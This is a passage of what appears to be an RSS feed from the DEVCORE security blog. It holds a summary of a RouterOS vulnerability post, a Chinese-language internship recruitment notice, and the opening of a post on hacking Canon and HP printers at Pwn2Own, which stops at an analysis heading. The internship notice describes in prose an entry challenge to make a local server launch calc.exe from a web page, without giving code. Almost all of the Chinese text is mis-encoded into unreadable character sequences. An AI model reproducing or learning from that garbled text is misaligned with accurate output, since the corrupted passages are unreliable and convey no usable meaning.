&lt;p&gt;In this study, we have explored RouterOS in depth and revealed a security vulnerability that has been hidden in RouterOS for nine years. In addition, we found a design pattern in IPC that leads to a race condition. Meanwhile, we also open-source the tools used in the research at https://github.com/terrynini/routeros-tools for your reference.&lt;/p&gt;

&lt;p&gt;Through this paper, DEVCORE hopes to share our discoveries and experiences to help white hat hackers gain a deeper understanding of RouterOS and make it more understandable.&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en/</link>
                <guid>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en</guid>
                <pubDate>Fri, 24 May 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2024 ç¬¬äº”å±†å¯¦ç¿’ç”Ÿè¨ˆç•«</title>
                <description>&lt;p&gt;DEVCORE å‰µç«‹è¿„ä»Šå·²é€¾åå¹´ï¼ŒæŒçºŒå°ˆæ³¨æ–¼æä¾›ä¸»å‹•å¼è³‡å®‰æœå‹™ï¼Œä¸¦è‡´åŠ›å°‹æ‰¾å„ç¨®å®‰å…¨é¢¨éšªåŠæ¼æ´ï¼Œè®“ä¸–ç•Œè®Šå¾—æ›´å®‰å…¨ã€‚ç‚ºäº†æŒçºŒå°‹æ‰¾æ›´å¤šæ“æœ‰ç›¸åŒç†å¿µçš„è³‡å®‰æ–°éŠ³ã€å”åŠ©å­¸ç”Ÿå»ºæ§‹æ­£ç¢ºè³‡å®‰æ„è­˜åŠæŠ€èƒ½ï¼Œæˆ‘å€‘æˆç«‹äº†ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€ï¼Œ2022 å¹´åˆä¹Ÿé–‹å§‹èˆ‰è¾¦é¦–å±†å¯¦ç¿’ç”Ÿè¨ˆç•«ï¼Œç›®å‰ç‚ºæ­¢æˆæœé —è±ã€è¶…ä¹é æœŸï¼Œç¬¬å››å±†å¯¦ç¿’ç”Ÿè¨ˆç•«ä¹Ÿå°‡æ–¼ä»Šå¹´ 1 æœˆåº•å‘Šä¸€æ®µè½ã€‚æˆ‘å€‘å¾ˆæ¦®å¹¸åœ°å®£ä½ˆï¼Œç¬¬äº”å±†å¯¦ç¿’ç”Ÿè¨ˆç•«å³å°‡ç™»å ´ï¼Œè‹¥æ‚¨æœŸå¾…åŠ å…¥æˆ‘å€‘ã€ç²¾é€²è³‡å®‰æŠ€èƒ½ï¼Œç…©è«‹è©³é–±ä¸‹åˆ—è³‡è¨Šå¾Œä¾†ä¿¡å ±åï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å¯¦ç¿’å…§å®¹&quot;&gt;å¯¦ç¿’å…§å®¹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡å¯¦ç¿’åˆ†ç‚º Binary åŠ Web å…©å€‹çµ„åˆ¥ï¼Œä¸»è¦å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
ä»¥ç ”ç©¶ç‚ºä¸»ï¼Œåœ¨èˆ‡å°å¸«ç¢ºå®šç ”ç©¶æ¨™çš„å¾Œï¼Œåˆ†æç›®æ¨™æ¶æ§‹ã€é€²è¡Œé€†å‘å·¥ç¨‹æˆ–ç¨‹å¼ç¢¼å¯©æŸ¥ã€‚è—‰ç”±é€™å€‹éç¨‹è¨“ç·´è‡ªå·±çš„æ€è·¯ï¼Œæ‰¾å‡ºå¯èƒ½çš„æ”»æ“Šé¢èˆ‡æ½›åœ¨çš„å¼±é»ã€‚å¦å¤–ä¹Ÿæœƒè®“å¤§å®¶å˜—è©¦åˆ†æåŠå¯«éå¾€æ¼æ´çš„ Exploitï¼Œç†è§£éå»æ¼æ´éƒ½å‡ºç¾åœ¨å“ªï¼Œé«”é©—çœŸå¯¦ä¸–ç•Œçš„æ¼æ´éƒ½æ˜¯å¦‚ä½•åˆ©ç”¨ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´æŒ–æ˜åŠç ”ç©¶ 70 %&lt;/li&gt;
      &lt;li&gt;1-day é–‹ç™¼ (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
å°å¸«æœƒèˆ‡å­¸ç”Ÿè¨è«–ä¸¦ç¢ºå®šä¸€å€‹ä»¥å­¸ç”Ÿçš„æœŸæœ›ç‚ºä¸»çš„å¯¦ç¿’ç›®æ¨™ï¼Œä¸¦åœ¨éç¨‹è¼”å°æˆé•·ä»¥å®Œæˆç›®æ¨™ï¼Œå…§å®¹å¯ä»¥æ˜¯æ·±å…¥ç ”ç©¶è¿‘å¹´å¸¸è¦‹æ–°å‹æ…‹æ¼æ´ã€æ”»æ“Šæ‰‹æ³•ã€é–‹æºè»Ÿé«”ï¼Œæˆ–æ˜¯ç¨‹å¼èªè¨€ç”Ÿæ…‹ç³»çš„å¸¸è¦‹å¼±é»ï¼Œäº¦æˆ–æ˜¯å±•ç¾ä½ çš„æŠ€è¡“åŠ›ä»¥é–‹ç™¼èˆ‡ç´…éšŠç›¸é—œçš„å·¥å…·ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´ã€æ”»æ“Šæ‰‹æ³•æˆ–é–‹ç™¼å·¥å…·ç ”ç©¶ 90%&lt;/li&gt;
      &lt;li&gt;æˆæœå ±å‘Šèˆ‡æº–å‚™ 10%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å…¬å¸åœ°é»&quot;&gt;å…¬å¸åœ°é»&lt;/h3&gt;

&lt;p&gt;å°åŒ—å¸‚æ¾å±±å€å…«å¾·è·¯ä¸‰æ®µ 32 è™Ÿ 13 æ¨“&lt;/p&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ™‚é–“&quot;&gt;å¯¦ç¿’æ™‚é–“&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2024 å¹´ 3 æœˆé–‹å§‹åˆ° 2024 å¹´ 7 æœˆåº•ï¼Œå…± 5 å€‹æœˆã€‚&lt;/li&gt;
  &lt;li&gt;æ¯é€±å·¥ä½œå…©å¤©ï¼Œå·¥ä½œæ™‚é–“ç‚º 10:00 â€“ 18:00
    &lt;ul&gt;
      &lt;li&gt;æ¯é€±å›ºå®šä¸€å¤©ä¸‹åˆ 14:00 - 18:00 å¿…é ˆåˆ°å…¬å¸è¨è«–é€²åº¦
        &lt;ul&gt;
          &lt;li&gt;å¦‚æœå±…ä½é›™åŒ—å¤–å¯å½ˆæ€§èª¿æ•´(ä½†é ˆæ¯å€‹çµ„åˆ¥çµ±ä¸€)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;å…¶é¤˜æ™‚é–“çš†ç‚ºé ç«¯ä½œæ¥­&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‹›å‹Ÿå°è±¡&quot;&gt;æ‹›å‹Ÿå°è±¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;å…·æœ‰ä¸€å®šç¨‹åº¦è³‡å®‰èƒŒæ™¯çš„å­¸ç”Ÿï¼Œä¸”å¯æ¯é€±å·¥ä½œå…©å¤©&lt;/li&gt;
  &lt;li&gt;æ­¤å¤–ä¸¦ç„¡å…¶ä»–æ‹›å‹Ÿé™åˆ¶ï¼Œæ­·å±†å¯¦ç¿’ç”Ÿå¯é‡è¤‡æ‡‰å¾µ&lt;/li&gt;
  &lt;li&gt;å°è³‡æ ¼æœ‰ä»»ä½•ç–‘æ…®ï¼Œæ­¡è¿ä¾†ä¿¡è©¢å•&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;é è¨ˆæ‹›æ”¶åé¡&quot;&gt;é è¨ˆæ‹›æ”¶åé¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary çµ„ï¼š2~3 äºº&lt;/li&gt;
  &lt;li&gt;Web çµ„ï¼š2~3 äºº&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è–ªè³‡å¾…é‡&quot;&gt;è–ªè³‡å¾…é‡&lt;/h3&gt;

&lt;p&gt;æ¯æœˆæ–°å°å¹£ 16,000 å…ƒ&lt;/p&gt;

&lt;h2 id=&quot;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&quot;&gt;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&lt;/h2&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ¢ä»¶è¦æ±‚&quot;&gt;å¯¦ç¿’æ¢ä»¶è¦æ±‚&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;åŸºæœ¬é€†å‘å·¥ç¨‹åŠé™¤éŒ¯èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;èƒ½çœ‹æ‡‚çµ„åˆèªè¨€ä¸¦ç­è§£åŸºæœ¬ Debugger ä½¿ç”¨æŠ€å·§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŸºæœ¬æ¼æ´åˆ©ç”¨èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;é ˆçŸ¥é“ Stack overflowã€ROP ç­‰ç›¸é—œåˆ©ç”¨æŠ€å·§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŸºæœ¬ Scripting Language é–‹ç™¼èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;Pythonã€Ruby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™åˆ†æå¤§å‹ Open Source å°ˆæ¡ˆèƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;ä»¥ C/C++ ç‚ºä¸»&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™åŸºç¤ä½œæ¥­ç³»çµ±çŸ¥è­˜
    &lt;ul&gt;
      &lt;li&gt;ä¾‹å¦‚çŸ¥é“ Virtual Address èˆ‡ Physical Address çš„æ¦‚å¿µ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;çŸ¥é“æ€æ¨£å¯«çš„ç¨‹å¼ç¢¼æœƒæœ‰å•é¡Œ
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;â€¦&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™ç ”ç©¶ç†±èª ï¼Œç¿’æ…£äº†è§£æŠ€è¡“æœ¬è³ª&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;CTF æ¯”è³½ç¶“é©—&lt;/li&gt;
      &lt;li&gt;pwnable.tw æˆç¸¾&lt;/li&gt;
      &lt;li&gt;æ¨‚æ–¼åˆ†äº«æŠ€è¡“
        &lt;ul&gt;
          &lt;li&gt;æœ‰å…¬é–‹çš„æŠ€è¡“ blog/slideã€Write-ups æˆ–æ˜¯æ¼”è¬›&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ç²¾é€š IDA Pro æˆ– Ghidra&lt;/li&gt;
      &lt;li&gt;æœ‰å¯«é 1-day åˆ©ç”¨ç¨‹å¼&lt;/li&gt;
      &lt;li&gt;å…·å‚™ä¸‹åˆ—å…¶ä¸­ä¹‹ä¸€ç¶“é©—
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ç†Ÿæ‚‰ OWASP Web Top 10ã€‚&lt;/li&gt;
  &lt;li&gt;ç†è§£ PortSwigger Web Security Academy ä¸­æ‰€æœ‰çš„å®‰å…¨è­°é¡Œæˆ–å·²å®Œæˆæ‰€æœ‰ Labã€‚
    &lt;ul&gt;
      &lt;li&gt;åƒè€ƒé€£çµï¼šhttps://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç†è§£è¨ˆç®—æ©Ÿç¶²è·¯çš„åŸºæœ¬æ¦‚å¿µã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Command Line æ“ä½œï¼ŒåŒ…å« Unix-like å’Œ Windows ä½œæ¥­ç³»çµ±çš„å¸¸è¦‹æˆ–å…§å»ºç³»çµ±æŒ‡ä»¤å·¥å…·ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼èªè¨€ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€JSPï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶ã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™å¯ä»¥å»ºç½®ã€è¨­å®šå¸¸è¦‹ç¶²é ä¼ºæœå™¨ï¼ˆå¦‚ï¼šNginxã€Apacheï¼‰åŠä½œæ¥­ç³»çµ±ï¼ˆå¦‚ï¼šLinuxï¼‰çš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™è¿½æ ¹ç©¶æŸ¢çš„ç²¾ç¥ã€‚&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´ã€‚&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹åˆ†æéå·²çŸ¥æ¼æ´ä¸¦èƒ½æ’°å¯« 1-day exploitã€‚&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“æ–¼ CTF æ¯”è³½ä¸­æ“”ä»»å‡ºé¡Œè€…ä¸¦å»ºç½®éé¡Œç›®ã€‚&lt;/li&gt;
      &lt;li&gt;æ“æœ‰ OSCP è­‰ç…§æˆ–åŒç­‰èƒ½åŠ›ä¹‹è­‰ç…§ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‡‰å¾µæµç¨‹&quot;&gt;æ‡‰å¾µæµç¨‹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡ç”„é¸ä¸€å…±åˆ†ç‚ºäºŒå€‹éšæ®µï¼š&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬ä¸€éšæ®µæ›¸é¢å¯©æŸ¥&quot;&gt;ç¬¬ä¸€éšæ®µï¼šæ›¸é¢å¯©æŸ¥&lt;/h4&gt;

&lt;p&gt;ç¬¬ä¸€éšæ®µç‚ºæ›¸é¢å¯©æŸ¥ï¼Œæœƒéœ€è¦å¯©æŸ¥ä¸‹åˆ—å…©å€‹é …ç›®&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹&lt;/li&gt;
  &lt;li&gt;ç°¡ç­”é¡Œç­”æ¡ˆ
    &lt;ul&gt;
      &lt;li&gt;é¡Œç›® 1ï¼šè«‹æå‡ºä¸‰å€‹ï¼Œä½ å°è±¡æœ€æ·±åˆ»æˆ–æ„Ÿåˆ°æœ‰è¶£ã€æ–¼è¥¿å…ƒ 2021 ~ 2023 å¹´é–“å…¬é–‹çš„çœŸå¯¦æ¼æ´æˆ–æ”»æ“Šéˆæ¡ˆä¾‹ï¼Œä¸¦ä¾è‡ªå·±çš„ç†è§£ç°¡è¿°èªªæ˜å„å€‹æ¼æ´çš„æˆå› ã€åˆ©ç”¨æ¢ä»¶å’Œå¯ä»¥é€ æˆçš„å½±éŸ¿ã€‚&lt;/li&gt;
      &lt;li&gt;é¡Œç›® 2ï¼šå¯¦ç¿’æœŸé–“æƒ³è¦ç ”ç©¶çš„ä¸»é¡Œï¼Œè«‹æå‡ºä¸‰å€‹å¯èƒ½é¸æ“‡çš„æ˜ç¢ºä¸»é¡Œï¼Œä¸¦ç°¡å–®èªªæ˜æå‡ºçš„ç†ç”±æˆ–æƒ³å®Œæˆçš„å…§å®¹ï¼Œä¾‹å¦‚ï¼š
        &lt;ul&gt;
          &lt;li&gt;ç ”ç©¶â—¯â—¯é–‹æºè»Ÿé«”ï¼Œæ‰¾åˆ°å¯ RCE çš„é‡å¤§é¢¨éšªå¼±é»ã€‚&lt;/li&gt;
          &lt;li&gt;ç ”ç©¶ AD CS çš„æ”»æ“Šæ‰‹æ³•ï¼Œå˜—è©¦æŒ–æ˜æ–°çš„æ”»æ“Šå¯èƒ½æ€§æˆ–å‘é‡ã€‚&lt;/li&gt;
          &lt;li&gt;ç ”ç©¶å¸¸è¦‹çš„è·¯ç”±å™¨ï¼Œç›®æ¨™åŒ…æ‹¬ï¼šAA-123 è·¯ç”±å™¨ã€BB-456 ç„¡ç·šè·¯ç”±å™¨ã€‚&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;é¡Œç›® 3ï¼ˆæ‡‰å¾µ Binary çµ„éœ€å›ç­”ï¼‰ï¼šè©²&lt;a href=&quot;/assets/files/recruit/binary/2024_Intern_Challenge.py&quot;&gt;ç¨‹å¼&lt;/a&gt;ç‚ºä¸€å€‹ Local Serverï¼Œå¯é€éç€è¦½ç¶²é èˆ‡ä¹‹äº’å‹•ï¼Œè©² Server è·‘åœ¨ Windows 11 çš„é›»è…¦ä¸Šã€‚
        &lt;ul&gt;
          &lt;li&gt;è«‹åˆ†æä¸Šè¿°æ‰€æä¾›çš„ Serverï¼Œä¸¦åˆ©ç”¨å…¶ä¸­çš„åŠŸèƒ½ï¼Œè®“ä½¿ç”¨è€…ç€è¦½ç¶²é å¾Œï¼Œå¯ç›´æ¥åœ¨ Windows 11 ä¸Šè·³å‡º calc.exeï¼Œå¦å¤–ä¹Ÿè«‹ç›¡é‡æ»¿è¶³ä¸‹åˆ—æ¢ä»¶
            &lt;ul&gt;
              &lt;li&gt;ä¸å¯è·³&lt;strong&gt;ä»»ä½•&lt;/strong&gt;è­¦å‘Šè¦–çª—ã€‚&lt;/li&gt;
              &lt;li&gt;ä½¿ç”¨è€…åªè¦ç€è¦½ç¶²é å³å¯è§¸ç™¼ä¸æœƒæœ‰é¡å¤–æ“ä½œã€‚&lt;/li&gt;
              &lt;li&gt;ç€è¦½å™¨é™åˆ¶ç‚º Chrome æˆ–æ˜¯ MS Edge&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;è«‹å‹™å¿…å¯«ä¸‹è§£é¡Œéç¨‹ï¼Œä¸¦äº¤ write-upï¼Œè«‹ç›¡ä½ æ‰€èƒ½ä¾†è§£é¡Œï¼Œå³ä½¿æœ€å¾Œæ²’æœ‰æˆåŠŸï¼Œä¹Ÿè«‹å¯«ä¸‹æ‚¨æ‰€å˜—è©¦éçš„æ–¹æ³•åŠæ€è·¯ï¼Œæœ¬æ¸¬é©—å°‡æœƒä»¥ write-up ç‚ºä¸»è¦ä¾æ“šã€‚&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æœ¬éšæ®µæ”¶ä»¶æˆªæ­¢æ™‚é–“ç‚º &lt;strong&gt;2024/01/28 23:59&lt;/strong&gt;ï¼Œæˆ‘å€‘æœƒæ ¹æ“šæ‚¨çš„å±¥æ­·åŠé¡Œç›®æ‰€å›ç­”çš„å…§å®¹ä¾†æ±ºå®šæ˜¯å¦æœ‰é€šéç¬¬ä¸€éšæ®µï¼Œæˆ‘å€‘æœƒåœ¨ 10 å€‹&lt;strong&gt;å·¥ä½œå¤©&lt;/strong&gt;å…§å›è¦†ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬äºŒéšæ®µé¢è©¦&quot;&gt;ç¬¬äºŒéšæ®µï¼šé¢è©¦&lt;/h4&gt;
&lt;p&gt;æ­¤éšæ®µç‚º 30~120 åˆ†é˜ï¼ˆä¾ç…§çµ„åˆ¥éœ€æ±‚è€Œå®šï¼Œæœƒå¦è¡Œé€šçŸ¥ï¼‰çš„é¢è©¦ï¼Œæœƒæœ‰ 2~3 ä½è³‡æ·±å¤¥ä¼´åƒèˆ‡ï¼Œè©•ä¼°æ‚¨æ˜¯å¦å…·å‚™æœ¬æ¬¡å¯¦ç¿’æ‰€éœ€çš„æŠ€è¡“èƒ½åŠ›èˆ‡äººæ ¼ç‰¹è³ªã€‚&lt;/p&gt;

&lt;h4 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2024/01/05 - 2024/01/28 å…¬é–‹æ‹›å‹Ÿï¼Œæ›¸å¯©æˆªæ­¢&lt;/li&gt;
  &lt;li&gt;2024/01/29 - 2024/02/22 é¢è©¦&lt;/li&gt;
  &lt;li&gt;2024/02/26 å‰å›æ‡‰çµæœï¼Œæ—©é¢è©¦æœƒæ—©æ”¶åˆ°çµæœ&lt;/li&gt;
  &lt;li&gt;2024/03/04 ç¬¬äº”å±†å¯¦ç¿’è¨ˆç•«æ–¼ç•¶é€±é–‹å§‹&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å ±åæ–¹å¼&quot;&gt;å ±åæ–¹å¼&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;è«‹å°‡æ‚¨çš„&lt;strong&gt;å±¥æ­·&lt;/strong&gt;åŠ&lt;strong&gt;é¡Œç›®ç­”æ¡ˆ&lt;/strong&gt;ä»¥ PDF æ ¼å¼å¯„åˆ° recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;å±¥æ­·æ ¼å¼è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/li&gt;
      &lt;li&gt;è«‹æ–¼ &lt;strong&gt;2024/01/28 23:59&lt;/strong&gt; å‰å¯„å‡ºï¼ˆå¦‚æœåé¡å·²æ»¿å‰‡è¦–æƒ…æ³ææ—©çµæŸï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¿¡ä»¶æ¨™é¡Œæ ¼å¼ï¼š[æ‡‰å¾µ] è·ä½ æ‚¨çš„å§“åï¼ˆç¯„ä¾‹ï¼š[æ‡‰å¾µ] Web çµ„å¯¦ç¿’ç”Ÿ ç‹å°ç¾ï¼‰&lt;/li&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹è«‹å‹™å¿…æ§åˆ¶åœ¨ä¸‰é ä»¥å…§ï¼Œè‡³å°‘éœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š
    &lt;ul&gt;
      &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
      &lt;li&gt;å­¸æ­·&lt;/li&gt;
      &lt;li&gt;å¯¦ç¿’ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
      &lt;li&gt;éå»å°æ–¼è³‡å®‰çš„ç›¸é—œç ”ç©¶&lt;/li&gt;
      &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆ&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;æ¸¬è©¦ç¶²é &lt;/a&gt;ï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œå¦‚é€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ï¼Œæˆ‘å€‘æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼Œä¸¦æœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/01/05/5nd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2024/01/05/5nd-internship-program-recruit</guid>
                <pubDate>Fri, 05 Jan 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hacking Printers at Pwn2Own Toronto 2022&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å»¶çºŒ&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;ä¹‹å‰&lt;/a&gt;çš„ç ”ç©¶ï¼Œå»å¹´æˆ‘å€‘ä¹Ÿåœ¨ Canon çš„å…¶ä»–å‹è™Ÿä¸­ï¼Œæ‰¾åˆ°äº† Pre-auth RCE æ¼æ´ &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-553/&quot;&gt;(CVE-2023-0853&lt;/a&gt;ã€&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-554/&quot;&gt;CVE-2023-0854&lt;/a&gt;)ï¼ŒåŒæ™‚ HP çš„å°è¡¨æ©Ÿä¹Ÿæœ‰æ‰¾åˆ° Pre-auth RCE çš„æ¼æ´ï¼Œç„¶è€Œæœ€çµ‚èˆ‡å…¶ä»–éšŠä¼æ’æ´ã€‚æˆ‘å€‘å°‡åœ¨æœ¬æ–‡è¬›è¿°æˆ‘å€‘åœ¨ Pwn2own Toronto ä¸­æ‰€ä½¿ç”¨çš„ Canon åŠ &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-35178&quot;&gt;HP æ¼æ´&lt;/a&gt;çš„ç´°ç¯€ï¼Œä»¥åŠæˆ‘å€‘çš„åˆ©ç”¨æ–¹å¼ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pwn2Own Toronto 2022 Target&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Target&lt;/th&gt;
      &lt;th&gt;Price&lt;/th&gt;
      &lt;th&gt;Master of Pwn Points&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;HP Collor LaserJet Pro M479fdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Lexmark MC3224i&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Canon imageCLASS MF743Cdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;
